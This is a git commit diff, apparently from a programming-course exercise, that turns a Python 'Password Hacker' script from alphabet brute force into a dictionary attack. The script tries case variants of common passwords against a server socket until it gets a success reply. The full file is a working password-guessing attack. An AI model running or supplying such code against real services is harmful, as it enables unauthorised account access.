d222c540bb26cee77203b28c4f282e6aad1cbcc3
Stellupo <e.braido@gmail.com>
2020-08-26 19:41:31 +0200

    Password Hacker : stage 3 (creation d'un mdp à partir d'un fichier contenant tous les mdp les plus utilises)

--- PasswordHacker.py
+++ PasswordHacker.py
@@ -2,39 +2,77 @@ import socket
 import sys
 import itertools
 
-# definition d'un generateur
-def generator(liste):
-    for i in range(1, 1000000):
-        for a in itertools.product(liste, repeat=i):
-            password = "".join(a)
-            yield str(password)
+# cette fonction reformate les elements d'une liste en supprimant le saut de ligne et renvoie la nouvelle valeur
+def reformat(file):
+    for line in file:
+        line = line.strip("\n")
+        password = str(line)
+        yield password
+
+# cette fonction isole chaque lettre dans une sous-liste à laquelle
+# on ajoute le même lettre mais en majuscule [['g','G'],['o','O']]
+def combinaison(word):
+    combo = []
+    for letter in word:
+        combo.append([letter.lower(), letter.upper()])
+    return combo
+
+# cette fonction cree des mdp à partir des lettres de la liste, alternant entre minuscule et majuscule
+def password_creation(liste):
+    for a in itertools.product(*liste): 
+        word = str("".join(a))
+        yield word
+
+# cette fonction envoie une data au serveur et retourne la réponse du serveur decryptée
+def send_response(data):
+    # envoi du mdp au serveur
+    client_socket.send(data)
+    # reception de la réponse du serveur
+    response = client_socket.recv(1024)
+    msg = response.decode()
+    return msg
+
+# cette fonction teste les differents mdp possibles tant que la reponse du serveur n'est pas positif
+def main(msg,gen):
+    while msg != "Connection success !":
+        # recherche d'un mdp dans le fichier texte
+        password = next(gen)
+        # on teste les differentes ortograhpes du mot
+        combo = combinaison(password)
+        for i in password_creation(combo):
+            data = i.encode()
+            msg = send_response(data)
+            if msg != "Connection success!":
+                continue
+            elif msg == "Connection success!":
+                print(data.decode())
+                return
+
+# creation d'un socket
+client_socket = socket.socket()
 
 # stocke les arguments de ligne de commande dans args
 args = sys.argv
-# creation d'un socket
-client_socket = socket.socket()
+
 # connexion a un serveur
 hostname = args[1]  # car 0 c'est le nom du scripte
 port = int(args[2])
 address = (hostname, port)
 client_socket.connect(address)
-# envoi de donnees au serveur
-alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
-# utilisation du generateur avec l'alphabet
-gen = generator(alphabet)
-while True:
-    # creation du mdp lettre par lettre
-    password = next(gen)
-    password = password.encode()
-    # envoi du mdp au serveur
-    client_socket.send(password)
-    # reception de la réponse du serveur
-    response = client_socket.recv(1024)
-    response = response.decode()
-    if response == "Connection success!":
-        print(password.decode())
-        break
-    else:
-        continue
+
+# ouverture du fichier texte
+my_file = open(
+    '/Users/estelle/Desktop/Développement Web/Password Hacker2/Password Hacker/Smarter, dictionary-based brute force/passwords.txt',
+    "r")
+# transformation du fichier en une liste
+file_list = my_file.readlines()
+# on reformate les mdp de la liste en str
+gen = reformat(file_list)
+# variable envoyee a la fonction principale
+msg = ""
+# appel de la fonction principale
+main(msg,gen)
+# fermeture du fichier texte
+my_file.close()
 # fermeture du serveur
 client_socket.close()
